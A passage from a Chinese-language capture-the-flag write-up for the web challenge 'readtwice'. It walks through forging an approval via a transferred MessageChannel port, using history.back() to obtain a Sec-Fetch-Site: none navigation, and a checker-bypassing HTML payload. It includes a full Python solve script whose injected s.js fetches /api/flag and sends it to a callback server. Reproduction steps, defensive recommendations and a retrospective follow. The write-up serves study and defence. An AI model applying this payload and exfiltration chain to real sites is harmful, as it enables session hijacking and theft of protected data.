  const report = <%- JSON.stringify({ id, state }) %>;      // id 与 state 印在页面脚本里

  // 沙箱 iframe 加载完成后：建立消息通道并把一端交给沙箱；收到 ready 后调用批准接口（机制见 2.7.2）
  viewer.addEventListener("load", () => {
    const channel = new MessageChannel();
    channel.port1.onmessage = async (event) => {
      if (event.data !== "ready") return;                    // 收到 "ready" 才继续
      channel.port1.close();
      await fetch("/complete", {                             // 用审批页面自身的身份调用批准接口
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(report),
      });
    };
    viewer.contentWindow.postMessage("render", "*", [channel.port2]);   // 把通道的一头发给沙箱
  }, { once: true });
</script>
```

这段逻辑要做的事：等沙箱 iframe 加载完成后，建立一个消息通道，把通道的其中一头（port2）交给沙箱里的笔记；等通道另一头（port1）收到字符串 `"ready"` 时，就用当前页面的身份请求 `/complete`。

`MessageChannel` 的机制（理解这一步需要的全部内容）：

- `new MessageChannel()` 创建一对互相连通的消息端口，本文分别称端口 A（port1）与端口 B（port2）；
- 只有持有端口 B 的一方才能给端口 A 发消息；用普通的 `window.postMessage` 无法给端口发消息；
- `postMessage(消息, 目标, [端口])` 的第三个参数可以把端口**转移**给另一个窗口；转移后原持有者不能再使用该端口。转移允许跨源；
- 端口 A 的持有者（审批页面）**无法验证消息实际由谁发出**，它只认"端口 B 送来的消息"。

#### 2.7.2 攻击做法：把端口转交出去

正常设计里，端口 B 会被送进沙箱，由笔记脚本在完成"渲染"后回复 `"ready"`。攻击者的做法是：**让笔记脚本把端口 B 再转交给攻击者的页面，由攻击者页面发 `"ready"`**。因为端口消息不携带可验证的发送者身份，审批页面无从分辨。

`/s.js` 中负责这一段的代码（完整脚本见第五章）：

```javascript
// 在沙箱（/sandbox）中运行时走这里：收到端口后把它转交给"审批页面的打开者"
onmessage = e => { if (e.ports[0]) parent.opener.postMessage(0, "*", e.ports); };
```

`parent.opener` 的含义：沙箱页的父窗口是审批页面；审批页面的 `opener` 是"打开审批页面的那个窗口"，也就是攻击者的入口页。`window.opener` 可以跨源访问（它是浏览器提供的窗口引用，允许跨源向它 `postMessage`）；该引用得以保留的前提是审批页面没有设置 `Cross-Origin-Opener-Policy: same-origin`（COOP 会切断跨源 opener 关系），本题源码中的 helmet 配置关闭了 COOP（`crossOriginOpenerPolicy: false`）。于是端口 B 的完整流转路径是：

```
审批页面 --(postMessage 转移)--> 沙箱 iframe 里的笔记 --(s.js 转交)--> 入口页
```

入口页持有端口 B 后，直接发送 `"ready"`，审批页面的端口 A 收到，审批页面调用 `/complete`：

```javascript
// 入口页中的处理（完整脚本见第五章）：收到端口后回报 ready，触发审批页面的批准流程
onmessage = e => {
  const port = e.ports[0];
  if (!port) return;
  port.postMessage("ready");          // 冒充"笔记已就绪"
  // ...随后处理时机问题（2.8）
};
```

#### 2.7.3 为什么入口页打开的审批页面带着管理员会话

审批页面调用 `/complete` 时，`req.session.admin` 必须为真。它凭什么为真？入口页用 `window.open` 打开审批页面：

```javascript
const rid = new URLSearchParams(location.search).get("rid");   // 机器人追加在入口网址上的参数
// 用顶层导航打开审批页面：管理员 cookie 会随这次导航发送（原因见下）
window.open("http://localhost:3000/review?rid=" + rid);
```

`window.open` 打开的是一次**顶层导航**（浏览器在新窗口里加载一个文档）。`SameSite=Lax` 的 cookie 规则是：跨站请求默认不带 cookie，但**顶层导航例外**。机器人登录后种在 `localhost:3000` 的管理员会话 cookie 因此在这次导航中被发送，审批页面一打开就带着管理员会话。它随后对 `/complete` 的 `fetch` 是同源请求，同样带着会话。四项条件里的 `admin`、`id`、`state`（页面自己印的）都由审批页面自动满足，`prepared` 由机器人步骤 4 完成。四项全对，`approved = true`。

#### 2.7.4 本地验证

到这一步可以单独验证"批准"环节：在入口页的 `onmessage` 里打印日志、在 `/complete` 的服务器日志里观察 `admin=true match=true` 的行（第四章的日志示例第 4 行）。不需要走完 2.8，就能看到 `approved` 被置位。

### 2.8 问题三：让第二次访问带上 Sec-Fetch-Site: none

> 一句话说明：检查 4（`policy`）要求请求头 `Sec-Fetch-Site: none`，这个值只会出现在**由浏览器发起**的导航上（页面里的脚本发起的跳转一律带别的值）。历史回退（后退/前进）属于"由浏览器发起"；用一个"入口页先离开原地址、再回退"的序列，就能制造一次真实的、带 `none` 的重新请求，并让它经过 302 落到审查页上。

#### 2.8.1 背景：Sec-Fetch-Site 是什么

`Sec-Fetch-*` 系列请求头由浏览器自动附加（Fetch Metadata 机制），标明"这个请求是怎么发起的"。页面脚本无法伪造或修改这些头。`Sec-Fetch-Site` 的取值与含义：

| 取值 | 含义 | 典型来源 |
|---|---|---|
| `same-origin` / `same-site` / `cross-site` | 请求有"发起页面"，按发起页面与目标的站点关系取对应值 | 页面脚本发起的跳转、表单提交、`fetch`、点击链接等 |
| `none` | 请求没有"发起页面"，由浏览器本身发起 | 地址栏输入、点击书签、外部程序打开，以及**历史回退/前进**产生的重新请求 |

对照检查 4 的要求（`Sec-Fetch-Site: none` 且 `Sec-Fetch-Dest: document`）：请求必须是一次"由浏览器发起的顶层文档导航"。脚本能做出的所有跳转都不满足；**历史回退可以**。

> 补充：回退/前进产生的重新请求是否真的发出，与页面的缓存条件有关。本题的入口页响应带 `Cache-Control: no-store`（2.5），本地复现中回退触发了真实的第二次网络请求（第四章日志）。如果换成会被浏览器缓存直接复用的页面，可能不会产生这次请求。

#### 2.8.2 攻击序列：让主窗口回退进审查页

三个页面配合完成（角色：机器人主窗口停在入口页；弹窗停在 `helper`）：

```
① 弹窗被导航到 回调服务器/helper（由入口页脚本设置 `w.location`；必须在主窗口离开前完成）
   效果：弹窗换到攻击者自己的页面（与入口页同源），可以操作主窗口的历史

② 入口页（主窗口）执行：location = 'about:blank'
   效果：主窗口离开入口网址，历史记录变成 [入口网址, about:blank]

③ helper 执行：opener.history.back()
   效果：主窗口回退到入口网址，这是一次"由浏览器发起"的导航

④ 入口网址的第二次请求到达回调服务器（带 Sec-Fetch-Site: none、Sec-Fetch-Dest: document）
   回调服务器对第二次访问返回：302 → http://localhost:3000/reports/check?rid=<rid>

⑤ 浏览器跟随 302 请求审查页
   这次请求仍然带 Sec-Fetch-Site: none（该值属于导航本身，不因重定向改变）
   目标 localhost:3000 与 cookie 同站且是顶层导航 → 管理员 cookie 一并发送
   请求头同时满足 检查 4（none + document）与 检查 1（管理员会话）
```

三个细节：

- **`about:blank` 步骤的作用**：主窗口需要先"离开"入口网址，`history.back()` 才有可回退的记录（历史栈变成"入口网址 ← about:blank"，回退即回到入口）。`about:blank` 是一次不产生网络请求的导航，不会干扰机器人的导航监听（见下条）；
- **为什么 `helper` 能操作主窗口**：`helper` 与入口页都由攻击者控制、同源；同源窗口之间可以互相访问 `history` 对象。`opener` 是弹窗对"打开它的窗口"（主窗口）的引用；
- **为什么这次导航恰好设置 `finalized`**：机器人 `watchDocument` 的规则（2.3）是"主窗口的导航请求命中审查页 → `finalized = approved && !diverged`"。整个序列里主窗口的导航请求只有三次：入口网址（第一步，记为入口）、回退后再次访问入口网址（与入口相同，不算偏离）、以及 302 之后的审查页请求（命中）。`about:blank` 不产生网络请求，不会被计入。因此 `diverged` 保持为假，命中时 `approved` 已为真（2.7 完成），`finalized` 被置真。

`/` 路由的第二次访问处理（回调服务器端，完整脚本见第五章）：

```python
if visits[p.query] > 1:                       # 第二次访问
    self.send_response(302)
    self.send_header("Location",
        f"http://localhost:3000/reports/check?rid={q['rid'][0]}")
    self.end_headers()
    return
```

入口页自身的第一段脚本（主窗口侧，与 2.7 的入口页是同一段）：

```javascript
const q = new URLSearchParams(location.search);
const i = q.get("rid");
const w = open("http://localhost:3000/review?rid=" + i);     // 弹窗：审批页面（2.7）
// 沙箱转交的端口到达时执行：回报 ready 以触发批准（2.7），随后进入回退序列（2.8.2）
onmessage = e => {
  const port = e.ports[0];
  if (!port) return;
  port.postMessage("ready");                                  // 批准（2.7）
  setTimeout(() => {
    w.location = "/helper";                                   // 弹窗转去 helper
    setTimeout(() => location = "about:blank", 250);          // 主窗口离开入口网址（写入历史记录）
  }, 500);
};
```

`/helper` 的内容：

```html
<script>setTimeout(() => opener.history.back(), 500)</script>
```

#### 2.8.3 至此八项检查的状态

| # | 检查项 | 状态 | 由哪一步完成 |
|---|---|---|---|
| 1 | 管理员会话 | ✓ | 顶层导航（回退 + 302）自动携带 cookie |
| 2 | rid 匹配 | ✓ | 机器人追加，回调服务器原样放进 302 目标 |
| 3 | 笔记存在 | ✓ | 攻击者创建并通过检查（2.6） |
| 4 | `policy`（none + document） | ✓ | 回退产生的浏览器发起导航，经 302 保持 |
| 5 | `prepared` | ✓ | 机器人步骤 4 |
| 6 | `approved` | ✓ | 审批页面调用 `/complete`（2.7） |
| 7 | `finalized` | ✓ | 主窗口导航命中审查页时由 `watchDocument` 置位 |
| 8 | `!used` | ✓ | 首次消费 |

审查页随即输出笔记原文（无 CSP 响应头）。剩下最后一件事：把 flag 送出来。

### 2.9 问题四：把 flag 送到回调服务器

> 一句话说明：审查页输出的笔记原文会在挑战域（`http://localhost:3000`）顶层被浏览器渲染，`s.js` 因此再执行一次，这次它不再等待端口，而是直接以同源身份请求 `/api/flag`（管理员 cookie 随请求自动携带），把响应内容发送到回调服务器。

`s.js` 的完整正式版本（两个分支）：

```javascript
const q = new URLSearchParams(location.search);
const i = q.get("rid");
const C = "https://回调服务器";                      // 回调服务器地址

if (location.pathname == "/reports/check") {
  // 分支一：在审查页顶层渲染笔记原文时执行（第一次在沙箱里执行时不是这个分支）
  fetch("/api/flag")                                  // 同源请求，带管理员 cookie
    .then(r => r.text())
    .then(t => location = C + "/flag?x=" + btoa(t));  // 把响应内容 base64 后发往回调服务器
} else {
  // 分支二：在沙箱（/sandbox）里执行时走这里，转交消息端口（2.7）
  onmessage = e => { if (e.ports[0]) parent.opener.postMessage(0, "*", e.ports); };
}
```

两个分支由 `location.pathname` 区分：

| 执行位置 | `location.pathname` | 走的分支 |
|---|---|---|
| 审批页面的沙箱 iframe 内（笔记被 `/sandbox` 渲染） | `/sandbox` | 转交端口（2.7） |
| 审查页顶层（笔记原文被原样输出后渲染） | `/reports/check` | 读取 flag 并外传 |

分支一能成功读取 `/api/flag` 的原因：审查页的第二次访问是一次顶层导航，机器人浏览器的管理员 cookie 在当前页面（`localhost:3000`）上有效；`/api/flag` 与当前页面同源，`fetch` 自动携带该 cookie。

外传使用 `btoa(...)` 把响应内容（JSON 文本）编码进 URL 查询参数。这里绕开的是"让数据离开浏览器"的最后一环：浏览器允许页面把当前窗口导航到任意地址，查询参数即数据通道。回调服务器收到 `/flag?x=...` 后做一次 base64 解码，取出其中的 flag 值。

### 2.10 攻击链完整时序

把 2.5-2.9 的全部动作按时间顺序合在一起（S 表示服务端状态变化，括号内是第四章的日志行）：

| 序 | 发起方 | 动作 | 状态/日志 |
|---|---|---|---|
| 1 | 攻击者 | `POST /create` 提交 2.6.5 的笔记 | 检查通过，得到笔记编号 |
| 2 | 攻击者 | `POST /report`，网址为 `回调/?note=<编号>` | 机器人启动本轮审查 |
| 3 | 机器人 | 步骤 1：访问 `/reports/session` | 管理员会话建立 |
| 4 | 机器人 | 步骤 2：访问审查页（第一次） | `visited = true`（日志①） |
| 5 | 机器人 | 步骤 3：访问 `/api/flag` | flag 存入本轮记录 |
| 6 | 机器人 | 步骤 4：调用 `/reports/arm/<编号>` | `prepared = true` |
| 7 | 机器人 | 步骤 5：访问入口网址（第一次） | 回调日志 `entry visit #1` |
| 8 | 入口页 | `window.open` 打开审批页面 | 日志②（`/review`） |
| 9 | 审批页面 | 沙箱 iframe 加载 `/sandbox`，笔记渲染，`s.js` 执行并注册端口处理 | 日志③（`/sandbox`） |
| 10 | 审批页面 → 笔记 → 入口页 | 端口两次转移；入口页发送 `"ready"` | 无 |
| 11 | 审批页面 | 调用 `/complete` | `approved = true`（日志④） |
| 12 | 入口页 / 弹窗 / helper | 弹窗转 helper → `about:blank` → `history.back()` | 回调日志 `entry visit #2` |
| 13 | 回调服务器 | 第二次访问返回 302 → 审查页 | 无 |
| 14 | 机器人主窗口 | 请求审查页（第二次，`Sec-Fetch-Site: none`） | `finalized = true`；八项全过（日志⑤） |
| 15 | 审查页 | 输出笔记原文（无 CSP） | `used = true` |
| 16 | 笔记原文 | `s.js` 顶层分支执行：`fetch('/api/flag')` → 外传 | 回调日志收下 flag |

---

## 三、速查与参考

### 3.1 端点速查

| 端点 | 方法 | 作用 | 鉴权 |
|---|---|---|---|
| `/create` | POST | 创建笔记（过检查器） | 无 |
| `/report` | POST | 提交网址触发机器人审查 | 限速 3 次/分钟 |
| `/reports/session` | GET | 建立管理员会话 | 请求头 `X-Bot-Token` |
| `/reports/check` | GET | 审查页：第一次标记；第二次输出笔记原文 | 管理员会话 + 检查清单（2.4） |
| `/complete` | POST | 置 `approved = true` | 管理员会话 + `id` + `state` + `prepared` |
| `/review` | GET | 审批页面 | rid 匹配（**不检查管理员**） |
| `/sandbox` | GET | 在 iframe 中渲染笔记 | 管理员会话 + `prepared` |
| `/api/flag` | GET | 返回 flag | 管理员会话 + 存在本轮审查 |
| `/reports/arm/:id` | POST | 置 `prepared = true` | 请求头 `X-Bot-Token` |

### 3.2 审查状态字段

审查记录上有五个状态位，另有一个每轮随机的 `nonce`（它不是状态位）：

| 字段 | 初值 | 置位者 | 用途 |
|---|---|---|---|
| `visited` | false | 审查页第一次访问（机器人） | 决定审查页走哪个分支 |
| `prepared` | false | `/reports/arm/:id`（机器人） | 检查 5 |
| `approved` | false | `/complete`（审批页面被诱导调用） | 检查 6 |
| `finalized` | false | `watchDocument`（主窗口导航命中审查页时） | 检查 7 |
| `used` | false | 渲染成功时立即置位 | 检查 8，一次性消费 |
| `nonce` | 每轮随机 | 服务器生成，印在审批页面里 | `/complete` 的 `state` 对照 |

### 3.3 三个浏览器机制速查

| 机制 | 触发写法 | 效果 | 版本 |
|---|---|---|---|
| noscript 双模式 | `<noscript>` 内容 | JS 关：按标记解析；JS 开：按原始文本解析（提前在 `</noscript>` 处闭合） | 一直如此 |
| 声明式 Shadow DOM | `<template shadowrootmode=open>` | 内容进影子树；template 不进文档树；影子内容不计入子元素与文本 | Chrome 90 / 111 / 124 |
| DPU 部分更新 | `<?marker name=x>` + `<template for=x>` | 解析到 template 时把内容搬进 marker 位置；template 不进文档树 | Chrome 150 起支持；本题 152 实测可用 |

### 3.4 成功判据

本地复现时，看到下列内容即代表对应环节成功（完整日志解读见第四章）：

| 环节 | 判据 |
|---|---|
| 检查器通过 | `POST /create` 返回 302，Location 为 `/note/<编号>` |
| 脚本在沙箱执行 | 回调服务器收到 `/s.js` 请求（以及 2.6.6 验证时的 `/hit`） |
| 批准成功 | 服务端日志出现 `/REAL /complete admin=true ... match=true` |
| 第二次访问全过 | 服务端日志出现 `/CHECK ... sf=none/document ap=true fin=true prep=true` |
| 拿到 flag | 回调服务器打印 `FLAG = pwnsec{...}` |

---

## 四、完整链复现日志

以下是一次完整成功复现的原始输出（编号与 rid 为本次运行的取值）。为便于观察服务端内部状态，复现时在源码的几个关键路由开头加了一行日志（把当前状态写入容器内 `/tmp/proof.txt`；只做记录，不影响逻辑）。

### 4.1 攻击脚本与回调服务器输出

```text
[*] callback server on :8000
[*] /create → 302 Location=/note/f378f2bce2ecc059c395
[CB] entry visit #1 rid=f15f3f2e7f
[CB] helper hit → opener.history.back()
[CB] entry visit #2 rid=f15f3f2e7f
[CB] → 302 to /reports/check (traversal re-request = sf:none!)
[*] /report → 200

[FLAG] = pwnsec{real_flag_on_remote}
```

逐行对照：

| 行 | 含义 | 对应章节 |
|---|---|---|
| `[*] callback server on :8000` | 回调服务器启动（四个端点就绪） | 2.5 |
| `[*] /create → 302 Location=/note/f378f2...` | 笔记创建成功并通过检查器，编号为 `f378f2bce2ecc059c395` | 2.2、2.6 |
| `[CB] entry visit #1 rid=f15f3f2e7f` | 机器人第一次访问入口页（rid 由机器人追加） | 2.3、2.10 序 7 |
| `[CB] helper hit → opener.history.back()` | 弹窗被导航到 `/helper` 并触发主窗口历史回退 | 2.8 |
| `[CB] entry visit #2 rid=f15f3f2e7f` | 回退产生真实的第二次请求（`Sec-Fetch-Site: none` 在此请求上） | 2.8 |
| `[CB] → 302 to /reports/check ...` | 第二次访问返回 302，把导航送往审查页 | 2.8 |
| `[*] /report → 200` | `/report` 接口返回；此时整条链已执行完毕 | 无 |
| `[FLAG] = pwnsec{real_flag_on_remote}` | 回调服务器收到外传的 flag 并解码（本地占位值） | 2.9 |

### 4.2 服务端日志（容器内 `/tmp/proof.txt`）

```text
/CHECK rid=f15f3f2e admin=true visited=false sf=none/document ap=false fin=false prep=false used=false
/review rid=f15f3f2e7f235226807c8bb1 match=true admin=true
/sandbox rid=f15f3f2e7f235226807c8bb1 admin=true prepared=true
/REAL /complete admin=true id=f15f3f2e state=c72f07df prepared=true match=true
/CHECK rid=f15f3f2e admin=true visited=true sf=none/document ap=true fin=true prep=true used=false
```

逐行对照（`ap`=`approved`，`fin`=`finalized`，`prep`=`prepared`）：

| 行 | 含义 | 对应章节 |
|---|---|---|
| 第 1 行 `/CHECK ... visited=false ...` | 机器人访问审查页**第一次**：`visited` 尚为假；本次请求由 goto 发出，`sf=none/document` | 2.3 步骤 2 |
| 第 2 行 `/review ... match=true admin=true` | 审批页面被打开（弹窗顶层导航携带管理员 cookie） | 2.7.3 |
| 第 3 行 `/sandbox ... prepared=true` | 沙箱 iframe 加载笔记原文，`s.js` 在此执行 | 2.6.6 |
| 第 4 行 `/REAL /complete ... match=true` | 审批页面调用 `/complete` 成功（`admin`、`id`、`state`、`prepared` 全对） | 2.7 |
| 第 5 行 `/CHECK ... visited=true sf=none/document ap=true fin=true prep=true used=false` | 第二次访问：八项检查全过（`used=false` 是处理开始时的取值，通过后随即置真） | 2.8.3 |

第 5 行是整条链的收束点：`sf=none/document` 证明该请求由浏览器发起；`ap=true fin=true prep=true` 证明三项攻击者制造的检查全部完成。该请求之后，审查页输出笔记原文，笔记中的脚本在顶层再次执行并把 flag 发往回调服务器。

### 4.3 观察提示

- 想看回调服务器的逐请求日志，直接保留 4.1 的输出即可；`/s.js` 与 `/flag` 的请求也会到达此处（脚本 4.1 的精简打印未逐条显示它们）；
- 想看服务端五个状态位的演变，把 4.2 的两行 `/CHECK` 对照读即可；
- 每次运行编号与 rid 都会变化，属正常现象。

---

## 五、攻击脚本逐段讲解

完整攻击脚本如下（可在宿主机直接运行；它是本地复现版，官方原版从 `instance.json` 读取远程地址，复现时把两处地址改成本地映射）。脚本依赖 `requests` 库（`pip install requests`）。

```python
#!/usr/bin/env python3
import base64, json, threading
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from urllib.parse import parse_qs, urlencode, urlsplit
import requests

TARGET   = "http://127.0.0.1:3001"                 # 目标（宿主机视角，映射到容器 3000）
CALLBACK = "http://host.docker.internal:8000"      # 回调服务器地址（容器视角访问宿主机）

result, visits = {}, {}                            # result：收到的 flag；visits：入口页访问计数
ready = threading.Event()

class Handler(BaseHTTPRequestHandler):
    # 所有入站请求的处理入口：按路径分发到四个端点（路由 1-4 见下）
    def do_GET(self):
        parsed = urlsplit(self.path)
        query = parse_qs(parsed.query)

        # 路由 1：入口页。第一次返回带攻击脚本的页面；第二次（历史回退）返回 302
        if parsed.path == "/" and "rid" in query:
            key = parsed.query
            visits[key] = visits.get(key, 0) + 1
            print(f"[CB] entry visit #{visits[key]} rid={query['rid'][0][:10]}", flush=True)
            if visits[key] > 1:
                print("[CB] → 302 to /reports/check", flush=True)
                self.send_response(302)
                self.send_header("Location",
                    f"http://localhost:3000/reports/check?rid={query['rid'][0]}")
                self.end_headers()
                return
            # 第一次访问的页面：开弹窗打开审批页面；收到端口后发送 "ready"，随后转入回退序列
            body = ("<!doctype html><script>"
                    "const q=new URLSearchParams(location.search),"
                    "i=q.get('rid'),w=open('http://localhost:3000/review?rid='+i);"
                    "onmessage=e=>{let p=e.ports[0];if(!p)return;p.postMessage('ready');"
                    "setTimeout(()=>{w.location='/helper';"
                    "setTimeout(()=>location='about:blank',250)},500)}</script>").encode()

        # 路由 2：辅助页面。与入口页同源，负责对主窗口执行历史回退
        elif parsed.path == "/helper":
            print("[CB] helper hit → opener.history.back()", flush=True)
            body = (b"<!doctype html><script>"
                    b"setTimeout(()=>opener.history.back(),500)</script>")

        # 路由 3：注入笔记的脚本。双分支：审查页顶层=读 flag 外传；沙箱内=转交端口
        elif parsed.path == "/s.js":
            body = ("let q=new URLSearchParams(location.search),i=q.get('rid'),C='" + CALLBACK + "';"
                    "if(location.pathname=='/reports/check')"
                    "fetch('/api/flag').then(x=>x.text()).then(x=>location=C+'/flag?x='+btoa(x));"
                    "else onmessage=e=>{if(e.ports[0])parent.opener.postMessage(0,'*',e.ports)};"
                    ).encode()

        # 路由 4：flag 接收端点。参数 x 是 base64 编码的 /api/flag 响应
        elif parsed.path == "/flag" and "x" in query:
            result["flag"] = json.loads(base64.b64decode(query["x"][0]))["flag"]
            ready.set()
            body = b"ok"
        else:
            body = b"ok"

        self.send_response(200)
        self.send_header("Content-Type",
            "application/javascript" if parsed.path == "/s.js" else "text/html")
        self.send_header("Content-Length", str(len(body)))
        self.send_header("Cache-Control", "no-store")   # 入口页必须 no-store（2.8.1）
        self.end_headers()
        self.wfile.write(body)

    def log_message(self, *_): pass

server = ThreadingHTTPServer(("0.0.0.0", 8000), Handler)
threading.Thread(target=server.serve_forever, daemon=True).start()   # 后台线程，主流程继续
print("[*] callback server on :8000", flush=True)

# 主流程：创建笔记 → 提交入口页地址 → 等待 flag 回调
payload = ('<!doctype html><head><?marker name="c"></head><div>'
           '<template shadowrootmode=open><noscript>'
           '<a alt="</noscript></template><script src=' + CALLBACK + '/s.js></script>">x</a>'
           '</noscript></template></div>'
           '<template for=c><meta content="default-src \'none\'"'
           'http-equiv=content-security-policy></template>')
created = requests.post(TARGET + "/create",
                        data={"title": "t", "html": payload},
                        allow_redirects=False, timeout=15)
print(f"[*] /create → {created.status_code} Location={created.headers.get('Location','?')}")
created.raise_for_status()
note_id = created.headers["Location"].rsplit("/", 1)[-1]        # 从 302 的 Location 取编号

report_url = CALLBACK + "/?" + urlencode({"note": note_id})     # 提交入口页地址（带 note 参数）
response = requests.post(TARGET + "/report", data={"url": report_url}, timeout=25)
print(f"[*] /report → {response.status_code}")

if ready.wait(3) and "flag" in result:
    print("\n[FLAG] =", result["flag"])
else:
    print("[!!] no flag callback")
server.shutdown()
```

脚本各段与章节的对应关系：

| 脚本部分 | 作用 | 对应章节 |
|---|---|---|
| 路由 `/` | 入口页：开弹窗、收端口发 `ready`、转入回退序列；第二次访问给 302 | 2.7、2.8 |
| 路由 `/helper` | 对主窗口执行 `history.back()` | 2.8.2 |
| 路由 `/s.js` | 注入笔记的脚本（双分支） | 2.6、2.7、2.9 |
| 路由 `/flag` | 接收 base64 编码的 flag | 2.9 |
| `payload` 变量 | 2.6.5 组装的笔记 HTML | 2.6 |
| `/create` 调用 | 创建笔记并取回编号 | 2.2 |
| `/report` 调用 | 提交入口页地址，触发机器人 | 2.3 |

> 与官方原版脚本的两处差异（复现适配）：目标地址从 `instance.json` 的 `main` 端点改为本地映射 `http://127.0.0.1:3001`；回调地址从 `instance.json` 的 `callback` 端点改为 `http://host.docker.internal:8000`。逻辑与官方版本一致。

## 六、复现指南

### 6.1 环境要求

| 组件 | 要求 |
|---|---|
| Docker | 含 compose 插件 |
| Python | 3.8 及以上；安装 `requests`（`pip install requests`） |
| 端口 | 宿主机 `3001`（映射容器 `3000`）与 `8000`（回调服务器）可用 |
| 浏览器 | 无需本机浏览器；机器人自带（容器内 Chromium） |

### 6.2 步骤

```bash
# 1. 启动题目环境（首次构建约 1-2 分钟）
cd readtwice
docker compose up -d --build
curl -s -o /dev/null -w "%{http_code}\n" http://127.0.0.1:3001/    # 期望 200

# 2. 保存第五章脚本为 solve.py，运行（约 15 秒）
python3 solve.py
```

期望输出见 4.1：`/create` 302、两次 `entry visit`、302 重定向、最后 `FLAG = pwnsec{real_flag_on_remote}`。

### 6.3 观察与调试

| 想看什么 | 怎么做 |
|---|---|
| 回调服务器收到的每个请求 | 第五章脚本已打印主要事件；需要更细时在 `do_GET` 开头加一行打印 `self.path` |
| 服务端五个状态位 | 在 `/reports/check` 处理函数开头加 `appendFileSync("/tmp/proof.txt", ...)`（格式见 4.2），然后 `docker compose exec challenge cat /tmp/proof.txt` |
| 机器人是否访问了入口页 | 回调服务器日志的 `entry visit #1` |
| 回退是否产生真实请求 | 回调服务器日志出现 `entry visit #2`（没有出现说明入口响应缺少 `no-store` 或回退序列未执行） |
| 脚本是否在沙箱执行 | 2.6.6 的 `/hit` 验证法 |

### 6.4 常见问题

| 症状 | 原因 | 修法 |
|---|---|---|
| `/create` 返回 400 `Document profile rejected` | payload 与 2.6.5 不完全一致（常见：单引号、无引号属性、`</template>` 数量被改动） | 逐字节对照 2.6.5 的 payload |
| 笔记创建成功但整条链无反应 | 容器内 Chromium 过旧，不支持 DPU / 声明式 Shadow DOM | 使用题目原版镜像（Chromium 152 实测可用） |
| `/report` 返回 429 | 限速：同一分钟提交超过 3 次 | 等一分钟再试 |
| 只看到 `entry visit #1`，没有 `#2` | 弹窗被拦截或 helper 未执行 | 确认环境为无头模式（本题目机器人就是无头）；检查 `/helper` 路由是否可达 |
| 第二次访问返回 403 | 八项检查某项未过 | 对照 4.2 日志逐项看 `sf`、`ap`、`fin`、`prep` 哪个为假 |
| 收到 flag 但内容不对 | 本地 flag 就是占位值，属正常 | 改 `docker-compose.yml` 里的 `FLAG` 再试 |

---

## 七、防御建议

按攻击链的每个环节给出防御手段（防御顺序从"能否让这一环不存在"到"如何补救"）：

| # | 被利用的点 | 攻击原理 | 防御措施 |
|---|---|---|---|
| 1 | 检查器与渲染环境不一致 | 同一份输入在 JS 关闭与 JS 开启下解析结果不同 | 检查与执行使用同一环境；**更根本的做法：不存储、不渲染用户 HTML**（或改用白名单渲染器如 DOMPurify 并保持更新，且把 `template[shadowrootmode]`、`<?…>` 处理指令、`noscript` 等纳入拒绝清单） |
| 2 | CSP meta 的生效时机 | 笔记内的 meta 在文档末尾才被 DPU 搬入 head，脚本在它生效之前执行 | 保护性页面**只使用响应头 CSP**（从第一个字节就生效，没有时序窗口），不依赖文档内 meta |
| 3 | 审批逻辑信任"端口消息" | 消息端口可以跨源转交，审批页面无法验证 `ready` 的真实发送者 | 端口消息增加与发送者绑定的挑战值（且挑战值不出现在沙箱可读的通道）；或把"批准"改为服务端签发的一次性令牌 |
| 4 | `Sec-Fetch-Site: none` 被当作可信来源 | 历史回退等浏览器发起导航同样产生 `none` | 敏感操作叠加一次性 CSRF 令牌（写入首访响应、消费时校验），不把 Fetch Metadata 当唯一防线 |
| 5 | 审查状态可被逐项拼齐 | `approved`、`finalized` 可在窗口期内由不同来源分别置位 | 状态置位与消费之间加入会话级随机数绑定与短时效；消费成功后其余状态一并失效 |
| 6 | `/review` 不校验管理员 | 知道 rid 即可打开审批页面并读到 `state` | `/review` 同样要求管理员会话；`rid` 与 `state` 不同时出现在低权限可读的响应里 |
| 7 | rid 泄漏给提交的网址 | 机器人把 `rid` 追加到攻击者控制的网址上 | 内部编号与外部回执分离；或只允许提交同源网址 |

> 一句话总结防御要点：**"检查环境必须等于执行环境；响应用的保护必须来自响应头；让页面替服务器做安全决策时必须先解决'如何证明消息真是它发的'"**。

---

## 八、比赛过程复盘与改进方案

本章记录比赛期间的实际分析过程：做过哪些工作、在哪些判断上出错、以及对应的改进措施。记录的目的是形成可复查的经验，而不是叙述过程。

### 8.1 比赛期间完成的工作（事实清单）

| 工作 | 结果 |
|---|---|
| 搭建本地复现环境（Docker + 容器内 Chromium 152） | 完成，与远程同版本 |
| 审计全部端点与状态机（`server.js`、`bot.js`、`review.ejs`） | 完成，八项检查、五个状态位、机器人五步流程均核实 |
| 对检查器做模糊测试（结构性 12600 例 + 随机变异 3000 例 + 进化变异 3600 例，共 19200 例） | 全部失败；检查通过者的 DOM 与渲染结果零差异 |
| 对 `Sec-Fetch-Site` 做完整实测矩阵（goto/重定向/脚本跳转/弹窗/表单/Refresh/reload/noopener/noreferrer/透明源等） | 完成；确认除浏览器发起的导航外均得不到 `none` |
| 验证笔记在 `/sandbox` 中无法执行脚本（注入实测被 meta CSP 拦截） | 完成；据此得出"官方审批流程对合法笔记不可能触发"的结论 |
| 发现并实现一条旁路链（同站端口 cookie 传输），本地连续 3 次成功 | 完成；因远程条件不满足而无法用于远程（见 8.3） |
| 模拟远程拓扑（回调服务器移出容器）并实测差异 | 完成；确认唯一缺口是"批准"一环 |

比赛结束时状态：八项检查均已在本地通过（`approved` 依赖旁路链，见 8.3），但旁路链在远程不成立，未拿到远程 flag。

### 8.2 三个卡点

**卡点一：检查器绕过（未找到声明式 Shadow DOM 与 DPU 的组合）**

当时的判断：19200 例模糊测试全部失败，且逐项排查了 `noscript`、编码、截断、双 meta 等方向后，判定"检查器不可绕过"，并停止了该方向的搜索。

赛后对照（2.6 的 payload）：绕过依赖三个机制：`noscript` 双模式（一直存在）、声明式 Shadow DOM（2021/2023 年特性，MDN 有公开文档）、DPU（2026 年 5 月公告、Chrome 150 起支持的新特性）。其中声明式 Shadow DOM 的知识是已有的，只是没有被"检查器在数什么"这一提问激活；DPU 属于 2026 年新进入 Chrome 支持的特性。

当时可执行而未做的动作：做一次机制向检索，例如"两个环境读取同一份输入，可能有哪些解析差异"、"Chromium 近一年新增了哪些解析行为"。这两个提问的第一个结果页就包含 MDN 的模板元素文档与 Chrome 官方博客的 DPU 公告。

**卡点二：历史回退的两次误判**

